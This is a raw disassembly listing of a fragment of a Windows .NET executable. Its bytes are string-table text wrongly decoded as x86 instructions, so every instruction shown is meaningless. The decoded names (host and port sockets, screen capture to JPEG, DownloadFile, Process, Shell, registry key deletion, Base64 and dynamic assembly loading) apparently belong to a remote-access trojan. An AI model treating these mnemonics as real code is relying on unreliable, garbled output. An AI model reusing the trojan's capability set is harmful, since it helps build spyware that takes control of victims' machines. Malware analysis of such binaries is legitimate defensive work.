  40755d:	6e                   	outsb  %ds:(%esi),(%dx)
  40755e:	63 61 74             	arpl   %esp,0x74(%ecx)
  407561:	65 6e                	outsb  %gs:(%esi),(%dx)
  407563:	61                   	popa
  407564:	74 65                	je     0x4075cb
  407566:	4f                   	dec    %edi
  407567:	62 6a 65             	bound  %ebp,0x65(%edx)
  40756a:	63 74 00 53          	arpl   %esi,0x53(%eax,%eax,1)
  40756e:	65 72 76             	gs jb  0x4075e7
  407571:	65 72 43             	gs jb  0x4075b7
  407574:	6f                   	outsl  %ds:(%esi),(%dx)
  407575:	6d                   	insl   (%dx),%es:(%edi)
  407576:	70 75                	jo     0x4075ed
  407578:	74 65                	je     0x4075df
  40757a:	72 00                	jb     0x40757c
  40757c:	67 65 74 5f          	addr16 gs je 0x4075df
  407580:	49                   	dec    %ecx
  407581:	6e                   	outsb  %ds:(%esi),(%dx)
  407582:	66 6f                	outsw  %ds:(%esi),(%dx)
  407584:	00 67 65             	add    %ah,0x65(%edi)
  407587:	74 5f                	je     0x4075e8
  407589:	54                   	push   %esp
  40758a:	6f                   	outsl  %ds:(%esi),(%dx)
  40758b:	74 61                	je     0x4075ee
  40758d:	6c                   	insb   (%dx),%es:(%edi)
  40758e:	50                   	push   %eax
  40758f:	68 79 73 69 63       	push   $0x63697379
  407594:	61                   	popa
  407595:	6c                   	insb   (%dx),%es:(%edi)
  407596:	4d                   	dec    %ebp
  407597:	65 6d                	gs insl (%dx),%es:(%edi)
  407599:	6f                   	outsl  %ds:(%esi),(%dx)
  40759a:	72 79                	jb     0x407615
  40759c:	00 55 49             	add    %dl,0x49(%ebp)
  40759f:	6e                   	outsb  %ds:(%esi),(%dx)
  4075a0:	74 36                	je     0x4075d8
  4075a2:	34 00                	xor    $0x0,%al
  4075a4:	43                   	inc    %ebx
  4075a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4075a6:	6e                   	outsb  %ds:(%esi),(%dx)
  4075a7:	76 65                	jbe    0x40760e
  4075a9:	72 73                	jb     0x40761e
  4075ab:	69 6f 6e 00 56 61 6c 	imul   $0x6c615600,0x6e(%edi),%ebp
  4075b2:	00 4d 61             	add    %cl,0x61(%ebp)
  4075b5:	74 68                	je     0x40761f
  4075b7:	00 52 6f             	add    %dl,0x6f(%edx)
  4075ba:	75 6e                	jne    0x40762a
  4075bc:	64 00 44 6f 75       	add    %al,%fs:0x75(%edi,%ebp,2)
  4075c1:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  4075c5:	52                   	push   %edx
  4075c6:	65 6d                	gs insl (%dx),%es:(%edi)
  4075c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4075c9:	76 65                	jbe    0x407630
  4075cb:	00 45 6e             	add    %al,0x6e(%ebp)
  4075ce:	64 52                	fs push %edx
  4075d0:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  4075d4:	76 65                	jbe    0x40763b
  4075d6:	00 54 6f 41          	add    %dl,0x41(%edi,%ebp,2)
  4075da:	72 72                	jb     0x40764e
  4075dc:	61                   	popa
  4075dd:	79 00                	jns    0x4075df
  4075df:	54                   	push   %esp
  4075e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4075e1:	4c                   	dec    %esp
  4075e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4075e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4075e4:	67 00 53 74          	add    %dl,0x74(%bp,%di)
  4075e8:	72 65                	jb     0x40764f
  4075ea:	61                   	popa
  4075eb:	6d                   	insl   (%dx),%es:(%edi)
  4075ec:	00 57 72             	add    %dl,0x72(%edi)
  4075ef:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  4075f6:	00 
  4075f7:	57                   	push   %edi
  4075f8:	72 69                	jb     0x407663
  4075fa:	74 65                	je     0x407661
  4075fc:	00 50 61             	add    %dl,0x61(%eax)
  4075ff:	72 61                	jb     0x407662
  407601:	6d                   	insl   (%dx),%es:(%edi)
  407602:	65 74 65             	gs je  0x40766a
  407605:	72 69                	jb     0x407670
  407607:	7a 65                	jp     0x40766e
  407609:	64 54                	fs push %esp
  40760b:	68 72 65 61 64       	push   $0x64616572
  407610:	53                   	push   %ebx
  407611:	74 61                	je     0x407674
  407613:	72 74                	jb     0x407689
  407615:	00 4e 65             	add    %cl,0x65(%esi)
  407618:	77 4c                	ja     0x407666
  40761a:	61                   	popa
  40761b:	74 65                	je     0x407682
  40761d:	42                   	inc    %edx
  40761e:	69 6e 64 69 6e 67 00 	imul   $0x676e69,0x64(%esi),%ebp
  407625:	4c                   	dec    %esp
  407626:	61                   	popa
  407627:	74 65                	je     0x40768e
  407629:	43                   	inc    %ebx
  40762a:	61                   	popa
  40762b:	6c                   	insb   (%dx),%es:(%edi)
  40762c:	6c                   	insb   (%dx),%es:(%edi)
  40762d:	00 4f 62             	add    %cl,0x62(%edi)
  407630:	6a 65                	push   $0x65
  407632:	63 74 46 6c          	arpl   %esi,0x6c(%esi,%eax,2)
  407636:	6f                   	outsl  %ds:(%esi),(%dx)
  407637:	77 43                	ja     0x40767c
  407639:	6f                   	outsl  %ds:(%esi),(%dx)
  40763a:	6e                   	outsb  %ds:(%esi),(%dx)
  40763b:	74 72                	je     0x4076af
  40763d:	6f                   	outsl  %ds:(%esi),(%dx)
  40763e:	6c                   	insb   (%dx),%es:(%edi)
  40763f:	00 43 68             	add    %al,0x68(%ebx)
  407642:	65 63 6b 46          	arpl   %ebp,%gs:0x46(%ebx)
  407646:	6f                   	outsl  %ds:(%esi),(%dx)
  407647:	72 53                	jb     0x40769c
  407649:	79 6e                	jns    0x4076b9
  40764b:	63 4c 6f 63          	arpl   %ecx,0x63(%edi,%ebp,2)
  40764f:	6b 4f 6e 56          	imul   $0x56,0x6e(%edi),%ecx
  407653:	61                   	popa
  407654:	6c                   	insb   (%dx),%es:(%edi)
  407655:	75 65                	jne    0x4076bc
  407657:	54                   	push   %esp
  407658:	79 70                	jns    0x4076ca
  40765a:	65 00 4d 6f          	add    %cl,%gs:0x6f(%ebp)
  40765e:	6e                   	outsb  %ds:(%esi),(%dx)
  40765f:	69 74 6f 72 00 45 6e 	imul   $0x746e4500,0x72(%edi,%ebp,2),%esi
  407666:	74 
  407667:	65 72 00             	gs jb  0x40766a
  40766a:	53                   	push   %ebx
  40766b:	65 6c                	gs insb (%dx),%es:(%edi)
  40766d:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  407672:	64 65 00 50 6f       	fs add %dl,%gs:0x6f(%eax)
  407677:	6c                   	insb   (%dx),%es:(%edi)
  407678:	6c                   	insb   (%dx),%es:(%edi)
  407679:	00 42 65             	add    %al,0x65(%edx)
  40767c:	67 69 6e 53 65 6e 64 	imul   $0x646e65,0x53(%bp),%ebp
  407683:	00 
  407684:	43                   	inc    %ebx
  407685:	6c                   	insb   (%dx),%es:(%edi)
  407686:	6f                   	outsl  %ds:(%esi),(%dx)
  407687:	73 65                	jae    0x4076ee
  407689:	00 47 43             	add    %al,0x43(%edi)
  40768c:	00 43 6f             	add    %al,0x6f(%ebx)
  40768f:	6c                   	insb   (%dx),%es:(%edi)
  407690:	6c                   	insb   (%dx),%es:(%edi)
  407691:	65 63 74 00 5f       	arpl   %esi,%gs:0x5f(%eax,%eax,1)
  407696:	43                   	inc    %ebx
  407697:	6c                   	insb   (%dx),%es:(%edi)
  407698:	6f                   	outsl  %ds:(%esi),(%dx)
  407699:	73 75                	jae    0x407710
  40769b:	72 65                	jb     0x407702
  40769d:	24 5f                	and    $0x5f,%al
  40769f:	5f                   	pop    %edi
  4076a0:	31 00                	xor    %eax,(%eax)
  4076a2:	24 56                	and    $0x56,%al
  4076a4:	42                   	inc    %edx
  4076a5:	24 4c                	and    $0x4c,%al
  4076a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4076a8:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4076ab:	5f                   	pop    %edi
  4076ac:	48                   	dec    %eax
  4076ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4076ae:	73 74                	jae    0x407724
  4076b0:	00 24 56             	add    %ah,(%esi,%edx,2)
  4076b3:	42                   	inc    %edx
  4076b4:	24 4c                	and    $0x4c,%al
  4076b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4076b7:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4076ba:	5f                   	pop    %edi
  4076bb:	50                   	push   %eax
  4076bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4076bd:	72 74                	jb     0x407733
  4076bf:	00 5f 4c             	add    %bl,0x4c(%edi)
  4076c2:	61                   	popa
  4076c3:	6d                   	insl   (%dx),%es:(%edi)
  4076c4:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  4076c8:	5f                   	pop    %edi
  4076c9:	5f                   	pop    %edi
  4076ca:	37                   	aaa
  4076cb:	00 5f 4c             	add    %bl,0x4c(%edi)
  4076ce:	61                   	popa
  4076cf:	6d                   	insl   (%dx),%es:(%edi)
  4076d0:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  4076d4:	5f                   	pop    %edi
  4076d5:	5f                   	pop    %edi
  4076d6:	35 00 5f 4c 61       	xor    $0x614c5f00,%eax
  4076db:	6d                   	insl   (%dx),%es:(%edi)
  4076dc:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  4076e0:	5f                   	pop    %edi
  4076e1:	5f                   	pop    %edi
  4076e2:	36 00 57 65          	add    %dl,%ss:0x65(%edi)
  4076e6:	62 43 6c             	bound  %eax,0x6c(%ebx)
  4076e9:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  4076f0:	73 74                	jae    0x407766
  4076f2:	65 6d                	gs insl (%dx),%es:(%edi)
  4076f4:	2e 44                	cs inc %esp
  4076f6:	72 61                	jb     0x407759
  4076f8:	77 69                	ja     0x407763
  4076fa:	6e                   	outsb  %ds:(%esi),(%dx)
  4076fb:	67 00 47 72          	add    %al,0x72(%bx)
  4076ff:	61                   	popa
  407700:	70 68                	jo     0x40776a
  407702:	69 63 73 00 53 69 7a 	imul   $0x7a695300,0x73(%ebx),%esp
  407709:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  40770d:	63 74 61 6e          	arpl   %esi,0x6e(%ecx,%eiz,2)
  407711:	67 6c                	insb   (%dx),%es:(%di)
  407713:	65 00 42 69          	add    %al,%gs:0x69(%edx)
  407717:	74 6d                	je     0x407786
  407719:	61                   	popa
  40771a:	70 00                	jo     0x40771c
  40771c:	53                   	push   %ebx
  40771d:	74 72                	je     0x407791
  40771f:	69 6e 67 73 00 43 6f 	imul   $0x6f430073,0x67(%esi),%ebp
  407726:	6d                   	insl   (%dx),%es:(%edi)
  407727:	70 61                	jo     0x40778a
  407729:	72 65                	jb     0x407790
  40772b:	4d                   	dec    %ebp
  40772c:	65 74 68             	gs je  0x407797
  40772f:	6f                   	outsl  %ds:(%esi),(%dx)
  407730:	64 00 53 79          	add    %dl,%fs:0x79(%ebx)
  407734:	73 74                	jae    0x4077aa
  407736:	65 6d                	gs insl (%dx),%es:(%edi)
  407738:	2e 57                	cs push %edi
  40773a:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  407741:	46                   	inc    %esi
  407742:	6f                   	outsl  %ds:(%esi),(%dx)
  407743:	72 6d                	jb     0x4077b2
  407745:	73 00                	jae    0x407747
  407747:	52                   	push   %edx
  407748:	65 73 74             	gs jae 0x4077bf
  40774b:	61                   	popa
  40774c:	72 74                	jb     0x4077c2
  40774e:	00 53 6f             	add    %dl,0x6f(%ebx)
  407751:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  407754:	74 53                	je     0x4077a9
  407756:	68 75 74 64 6f       	push   $0x6f647475
  40775b:	77 6e                	ja     0x4077cb
  40775d:	00 53 68             	add    %dl,0x68(%ebx)
  407760:	75 74                	jne    0x4077d6
  407762:	64 6f                	outsl  %fs:(%esi),(%dx)
  407764:	77 6e                	ja     0x4077d4
  407766:	00 43 6f             	add    %al,0x6f(%ebx)
  407769:	6e                   	outsb  %ds:(%esi),(%dx)
  40776a:	76 65                	jbe    0x4077d1
  40776c:	72 74                	jb     0x4077e2
  40776e:	00 46 72             	add    %al,0x72(%esi)
  407771:	6f                   	outsl  %ds:(%esi),(%dx)
  407772:	6d                   	insl   (%dx),%es:(%edi)
  407773:	42                   	inc    %edx
  407774:	61                   	popa
  407775:	73 65                	jae    0x4077dc
  407777:	36 34 53             	ss xor $0x53,%al
  40777a:	74 72                	je     0x4077ee
  40777c:	69 6e 67 00 53 65 72 	imul   $0x72655300,0x67(%esi),%ebp
  407783:	76 69                	jbe    0x4077ee
  407785:	63 65 50             	arpl   %esp,0x50(%ebp)
  407788:	6f                   	outsl  %ds:(%esi),(%dx)
  407789:	69 6e 74 4d 61 6e 61 	imul   $0x616e614d,0x74(%esi),%ebp
  407790:	67 65 72 00          	addr16 gs jb 0x407794
  407794:	73 65                	jae    0x4077fb
  407796:	74 5f                	je     0x4077f7
  407798:	45                   	inc    %ebp
  407799:	78 70                	js     0x40780b
  40779b:	65 63 74 31 30       	arpl   %esi,%gs:0x30(%ecx,%esi,1)
  4077a0:	30 43 6f             	xor    %al,0x6f(%ebx)
  4077a3:	6e                   	outsb  %ds:(%esi),(%dx)
  4077a4:	74 69                	je     0x40780f
  4077a6:	6e                   	outsb  %ds:(%esi),(%dx)
  4077a7:	75 65                	jne    0x40780e
  4077a9:	00 53 65             	add    %dl,0x65(%ebx)
  4077ac:	63 75 72             	arpl   %esi,0x72(%ebp)
  4077af:	69 74 79 50 72 6f 74 	imul   $0x6f746f72,0x50(%ecx,%edi,2),%esi
  4077b6:	6f 
  4077b7:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  4077ba:	54                   	push   %esp
  4077bb:	79 70                	jns    0x40782d
  4077bd:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4077c1:	74 5f                	je     0x407822
  4077c3:	53                   	push   %ebx
  4077c4:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4077c8:	69 74 79 50 72 6f 74 	imul   $0x6f746f72,0x50(%ecx,%edi,2),%esi
  4077cf:	6f 
  4077d0:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  4077d3:	00 73 65             	add    %dh,0x65(%ebx)
  4077d6:	74 5f                	je     0x407837
  4077d8:	44                   	inc    %esp
  4077d9:	65 66 61             	gs popaw
  4077dc:	75 6c                	jne    0x40784a
  4077de:	74 43                	je     0x407823
  4077e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4077e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4077e2:	6e                   	outsb  %ds:(%esi),(%dx)
  4077e3:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4077e8:	6e                   	outsb  %ds:(%esi),(%dx)
  4077e9:	4c                   	dec    %esp
  4077ea:	69 6d 69 74 00 47 65 	imul   $0x65470074,0x69(%ebp),%ebp
  4077f1:	74 54                	je     0x407847
  4077f3:	65 6d                	gs insl (%dx),%es:(%edi)
  4077f5:	70 50                	jo     0x407847
  4077f7:	61                   	popa
  4077f8:	74 68                	je     0x407862
  4077fa:	00 43 6f             	add    %al,0x6f(%ebx)
  4077fd:	6d                   	insl   (%dx),%es:(%edi)
  4077fe:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  407801:	65 00 44 6f 77       	add    %al,%gs:0x77(%edi,%ebp,2)
  407806:	6e                   	outsb  %ds:(%esi),(%dx)
  407807:	6c                   	insb   (%dx),%es:(%edi)
  407808:	6f                   	outsl  %ds:(%esi),(%dx)
  407809:	61                   	popa
  40780a:	64 46                	fs inc %esi
  40780c:	69 6c 65 00 50 72 6f 	imul   $0x636f7250,0x0(%ebp,%eiz,2),%ebp
  407813:	63 
  407814:	65 73 73             	gs jae 0x40788a
  407817:	00 49 6e             	add    %cl,0x6e(%ecx)
  40781a:	74 65                	je     0x407881
  40781c:	72 61                	jb     0x40787f
  40781e:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
  407822:	6e                   	outsb  %ds:(%esi),(%dx)
  407823:	00 41 70             	add    %al,0x70(%ecx)
  407826:	70 57                	jo     0x40787f
  407828:	69 6e 53 74 79 6c 65 	imul   $0x656c7974,0x53(%esi),%ebp
  40782f:	00 53 68             	add    %dl,0x68(%ebx)
  407832:	65 6c                	gs insb (%dx),%es:(%edi)
  407834:	6c                   	insb   (%dx),%es:(%edi)
  407835:	00 41 62             	add    %al,0x62(%ecx)
  407838:	6f                   	outsl  %ds:(%esi),(%dx)
  407839:	72 74                	jb     0x4078af
  40783b:	00 53 70             	add    %dl,0x70(%ebx)
  40783e:	65 63 69 61          	arpl   %ebp,%gs:0x61(%ecx)
  407842:	6c                   	insb   (%dx),%es:(%edi)
  407843:	46                   	inc    %esi
  407844:	6f                   	outsl  %ds:(%esi),(%dx)
  407845:	6c                   	insb   (%dx),%es:(%edi)
  407846:	64 65 72 00          	fs gs jb 0x40784a
  40784a:	47                   	inc    %edi
  40784b:	65 74 46             	gs je  0x407894
  40784e:	6f                   	outsl  %ds:(%esi),(%dx)
  40784f:	6c                   	insb   (%dx),%es:(%edi)
  407850:	64 65 72 50          	fs gs jb 0x4078a4
  407854:	61                   	popa
  407855:	74 68                	je     0x4078bf
  407857:	00 46 69             	add    %al,0x69(%esi)
  40785a:	6c                   	insb   (%dx),%es:(%edi)
  40785b:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  40785f:	61                   	popa
  407860:	64 41                	fs inc %ecx
  407862:	6c                   	insb   (%dx),%es:(%edi)
  407863:	6c                   	insb   (%dx),%es:(%edi)
  407864:	54                   	push   %esp
  407865:	65 78 74             	gs js  0x4078dc
  407868:	00 57 72             	add    %dl,0x72(%edi)
  40786b:	69 74 65 41 6c 6c 54 	imul   $0x65546c6c,0x41(%ebp,%eiz,2),%esi
  407872:	65 
  407873:	78 74                	js     0x4078e9
  407875:	00 67 65             	add    %ah,0x65(%edi)
  407878:	74 5f                	je     0x4078d9
  40787a:	4d                   	dec    %ebp
  40787b:	65 73 73             	gs jae 0x4078f1
  40787e:	61                   	popa
  40787f:	67 65 00 4d 69       	add    %cl,%gs:0x69(%di)
  407884:	63 72 6f             	arpl   %esi,0x6f(%edx)
  407887:	73 6f                	jae    0x4078f8
  407889:	66 74 2e             	data16 je 0x4078ba
  40788c:	56                   	push   %esi
  40788d:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  407894:	73 69                	jae    0x4078ff
  407896:	63 2e                	arpl   %ebp,(%esi)
  407898:	4d                   	dec    %ebp
  407899:	79 53                	jns    0x4078ee
  40789b:	65 72 76             	gs jb  0x407914
  40789e:	69 63 65 73 00 52 65 	imul   $0x65520073,0x65(%ebx),%esp
  4078a5:	67 69 73 74 72 79 50 	imul   $0x72507972,0x74(%bp,%di),%esi
  4078ac:	72 
  4078ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4078ae:	78 79                	js     0x407929
  4078b0:	00 67 65             	add    %ah,0x65(%edi)
  4078b3:	74 5f                	je     0x407914
  4078b5:	52                   	push   %edx
  4078b6:	65 67 69 73 74 72 79 	imul   $0x4d007972,%gs:0x74(%bp,%di),%esi
  4078bd:	00 4d 
  4078bf:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4078c6:	74 2e                	je     0x4078f6
  4078c8:	57                   	push   %edi
  4078c9:	69 6e 33 32 00 52 65 	imul   $0x65520032,0x33(%esi),%ebp
  4078d0:	67 69 73 74 72 79 4b 	imul   $0x654b7972,0x74(%bp,%di),%esi
  4078d7:	65 
  4078d8:	79 00                	jns    0x4078da
  4078da:	67 65 74 5f          	addr16 gs je 0x40793d
  4078de:	43                   	inc    %ebx
  4078df:	75 72                	jne    0x407953
  4078e1:	72 65                	jb     0x407948
  4078e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4078e4:	74 55                	je     0x40793b
  4078e6:	73 65                	jae    0x40794d
  4078e8:	72 00                	jb     0x4078ea
  4078ea:	44                   	inc    %esp
  4078eb:	65 6c                	gs insb (%dx),%es:(%edi)
  4078ed:	65 74 65             	gs je  0x407955
  4078f0:	53                   	push   %ebx
  4078f1:	75 62                	jne    0x407955
  4078f3:	4b                   	dec    %ebx
  4078f4:	65 79 00             	gs jns 0x4078f7
  4078f7:	53                   	push   %ebx
  4078f8:	63 72 65             	arpl   %esi,0x65(%edx)
  4078fb:	65 6e                	outsb  %gs:(%esi),(%dx)
  4078fd:	00 67 65             	add    %ah,0x65(%edi)
  407900:	74 5f                	je     0x407961
  407902:	50                   	push   %eax
  407903:	72 69                	jb     0x40796e
  407905:	6d                   	insl   (%dx),%es:(%edi)
  407906:	61                   	popa
  407907:	72 79                	jb     0x407982
  407909:	53                   	push   %ebx
  40790a:	63 72 65             	arpl   %esi,0x65(%edx)
  40790d:	65 6e                	outsb  %gs:(%esi),(%dx)
  40790f:	00 67 65             	add    %ah,0x65(%edi)
  407912:	74 5f                	je     0x407973
  407914:	42                   	inc    %edx
  407915:	6f                   	outsl  %ds:(%esi),(%dx)
  407916:	75 6e                	jne    0x407986
  407918:	64 73 00             	fs jae 0x40791b
  40791b:	67 65 74 5f          	addr16 gs je 0x40797e
  40791f:	57                   	push   %edi
  407920:	69 64 74 68 00 67 65 	imul   $0x74656700,0x68(%esp,%esi,2),%esp
  407927:	74 
  407928:	5f                   	pop    %edi
  407929:	48                   	dec    %eax
  40792a:	65 69 67 68 74 00 53 	imul   $0x79530074,%gs:0x68(%edi),%esp
  407931:	79 
  407932:	73 74                	jae    0x4079a8
  407934:	65 6d                	gs insl (%dx),%es:(%edi)
  407936:	2e 44                	cs inc %esp
  407938:	72 61                	jb     0x40799b
  40793a:	77 69                	ja     0x4079a5
  40793c:	6e                   	outsb  %ds:(%esi),(%dx)
  40793d:	67 2e 49             	addr16 cs dec %ecx
  407940:	6d                   	insl   (%dx),%es:(%edi)
  407941:	61                   	popa
  407942:	67 69 6e 67 00 50 69 	imul   $0x78695000,0x67(%bp),%ebp
  407949:	78 
  40794a:	65 6c                	gs insb (%dx),%es:(%edi)
  40794c:	46                   	inc    %esi
  40794d:	6f                   	outsl  %ds:(%esi),(%dx)
  40794e:	72 6d                	jb     0x4079bd
  407950:	61                   	popa
  407951:	74 00                	je     0x407953
  407953:	49                   	dec    %ecx
  407954:	6d                   	insl   (%dx),%es:(%edi)
  407955:	61                   	popa
  407956:	67 65 00 46 72       	add    %al,%gs:0x72(%bp)
  40795b:	6f                   	outsl  %ds:(%esi),(%dx)
  40795c:	6d                   	insl   (%dx),%es:(%edi)
  40795d:	49                   	dec    %ecx
  40795e:	6d                   	insl   (%dx),%es:(%edi)
  40795f:	61                   	popa
  407960:	67 65 00 43 6f       	add    %al,%gs:0x6f(%bp,%di)
  407965:	70 79                	jo     0x4079e0
  407967:	50                   	push   %eax
  407968:	69 78 65 6c 4f 70 65 	imul   $0x65704f6c,0x65(%eax),%edi
  40796f:	72 61                	jb     0x4079d2
  407971:	74 69                	je     0x4079dc
  407973:	6f                   	outsl  %ds:(%esi),(%dx)
  407974:	6e                   	outsb  %ds:(%esi),(%dx)
  407975:	00 43 6f             	add    %al,0x6f(%ebx)
  407978:	70 79                	jo     0x4079f3
  40797a:	46                   	inc    %esi
  40797b:	72 6f                	jb     0x4079ec
  40797d:	6d                   	insl   (%dx),%es:(%edi)
  40797e:	53                   	push   %ebx
  40797f:	63 72 65             	arpl   %esi,0x65(%edx)
  407982:	65 6e                	outsb  %gs:(%esi),(%dx)
  407984:	00 47 72             	add    %al,0x72(%edi)
  407987:	61                   	popa
  407988:	70 68                	jo     0x4079f2
  40798a:	69 63 73 55 6e 69 74 	imul   $0x74696e55,0x73(%ebx),%esp
  407991:	00 44 72 61          	add    %al,0x61(%edx,%esi,2)
  407995:	77 49                	ja     0x4079e0
  407997:	6d                   	insl   (%dx),%es:(%edi)
  407998:	61                   	popa
  407999:	67 65 00 49 6d       	add    %cl,%gs:0x6d(%bx,%di)
  40799e:	61                   	popa
  40799f:	67 65 46             	addr16 gs inc %esi
  4079a2:	6f                   	outsl  %ds:(%esi),(%dx)
  4079a3:	72 6d                	jb     0x407a12
  4079a5:	61                   	popa
  4079a6:	74 00                	je     0x4079a8
  4079a8:	67 65 74 5f          	addr16 gs je 0x407a0b
  4079ac:	4a                   	dec    %edx
  4079ad:	70 65                	jo     0x407a14
  4079af:	67 00 53 61          	add    %dl,0x61(%bp,%di)
  4079b3:	76 65                	jbe    0x407a1a
  4079b5:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  4079b9:	61                   	popa
  4079ba:	73 65                	jae    0x407a21
  4079bc:	36 34 53             	ss xor $0x53,%al
  4079bf:	74 72                	je     0x407a33
  4079c1:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  4079c8:	74 65                	je     0x407a2f
  4079ca:	6d                   	insl   (%dx),%es:(%edi)
  4079cb:	2e 52                	cs push %edx
  4079cd:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  4079d0:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4079d5:	6e                   	outsb  %ds:(%esi),(%dx)
  4079d6:	00 4d 65             	add    %cl,0x65(%ebp)
  4079d9:	74 68                	je     0x407a43
  4079db:	6f                   	outsl  %ds:(%esi),(%dx)
  4079dc:	64 49                	fs dec %ecx
  4079de:	6e                   	outsb  %ds:(%esi),(%dx)
  4079df:	66 6f                	outsw  %ds:(%esi),(%dx)
  4079e1:	00 41 70             	add    %al,0x70(%ecx)
  4079e4:	70 44                	jo     0x407a2a
  4079e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4079e7:	6d                   	insl   (%dx),%es:(%edi)
  4079e8:	61                   	popa
  4079e9:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  4079f0:	43                   	inc    %ebx
  4079f1:	75 72                	jne    0x407a65
  4079f3:	72 65                	jb     0x407a5a
  4079f5:	6e                   	outsb  %ds:(%esi),(%dx)
  4079f6:	74 44                	je     0x407a3c
  4079f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4079f9:	6d                   	insl   (%dx),%es:(%edi)
  4079fa:	61                   	popa
  4079fb:	69 6e 00 41 73 73 65 	imul   $0x65737341,0x0(%esi),%ebp
  407a02:	6d                   	insl   (%dx),%es:(%edi)
  407a03:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  407a07:	4c                   	dec    %esp
  407a08:	6f                   	outsl  %ds:(%esi),(%dx)
  407a09:	61                   	popa
  407a0a:	64 00 47 65          	add    %al,%fs:0x65(%edi)
  407a0e:	74 54                	je     0x407a64
  407a10:	79 70                	jns    0x407a82
  407a12:	65 73 00             	gs jae 0x407a15
  407a15:	4d                   	dec    %ebp
  407a16:	65 6d                	gs insl (%dx),%es:(%edi)
  407a18:	62 65 72             	bound  %esp,0x72(%ebp)
  407a1b:	49                   	dec    %ecx
  407a1c:	6e                   	outsb  %ds:(%esi),(%dx)
  407a1d:	66 6f                	outsw  %ds:(%esi),(%dx)
  407a1f:	00 67 65             	add    %ah,0x65(%edi)
  407a22:	74 5f                	je     0x407a83
  407a24:	4e                   	dec    %esi
  407a25:	61                   	popa
  407a26:	6d                   	insl   (%dx),%es:(%edi)
  407a27:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407a2b:	74 4d                	je     0x407a7a
  407a2d:	65 74 68             	gs je  0x407a98
  407a30:	6f                   	outsl  %ds:(%esi),(%dx)
  407a31:	64 73 00             	fs jae 0x407a34
  407a34:	4c                   	dec    %esp
  407a35:	61                   	popa
  407a36:	74 65                	je     0x407a9d
  407a38:	47                   	inc    %edi
  407a39:	65 74 00             	gs je  0x407a3c
  407a3c:	43                   	inc    %ebx
  407a3d:	6f                   	outsl  %ds:(%esi),(%dx)
  407a3e:	6e                   	outsb  %ds:(%esi),(%dx)
  407a3f:	64 69 74 69 6f 6e 61 	imul   $0x436c616e,%fs:0x6f(%ecx,%ebp,2),%esi
  407a46:	6c 43 
  407a48:	6f                   	outsl  %ds:(%esi),(%dx)
  407a49:	6d                   	insl   (%dx),%es:(%edi)
  407a4a:	70 61                	jo     0x407aad
  407a4c:	72 65                	jb     0x407ab3
  407a4e:	4f                   	dec    %edi
  407a4f:	62 6a 65             	bound  %ebp,0x65(%edx)
  407a52:	63 74 45 71          	arpl   %esi,0x71(%ebp,%eax,2)
  407a56:	75 61                	jne    0x407ab9
  407a58:	6c                   	insb   (%dx),%es:(%edi)
  407a59:	00 54 6f 49          	add    %dl,0x49(%edi,%ebp,2)
  407a5d:	6e                   	outsb  %ds:(%esi),(%dx)
  407a5e:	74 33                	je     0x407a93
  407a60:	32 00                	xor    (%eax),%al
  407a62:	49                   	dec    %ecx
  407a63:	6e                   	outsb  %ds:(%esi),(%dx)
  407a64:	74 33                	je     0x407a99
  407a66:	32 00                	xor    (%eax),%al
  407a68:	53                   	push   %ebx
  407a69:	74 61                	je     0x407acc
  407a6b:	72 74                	jb     0x407ae1
  407a6d:	73 57                	jae    0x407ac6
  407a6f:	69 74 68 00 45 78 69 	imul   $0x73697845,0x0(%eax,%ebp,2),%esi
  407a76:	73 
  407a77:	74 73                	je     0x407aec
  407a79:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  407a7d:	6f                   	outsl  %ds:(%esi),(%dx)
  407a7e:	6f                   	outsl  %ds:(%esi),(%dx)
  407a7f:	6c                   	insb   (%dx),%es:(%edi)
  407a80:	65 61                	gs popa
  407a82:	6e                   	outsb  %ds:(%esi),(%dx)
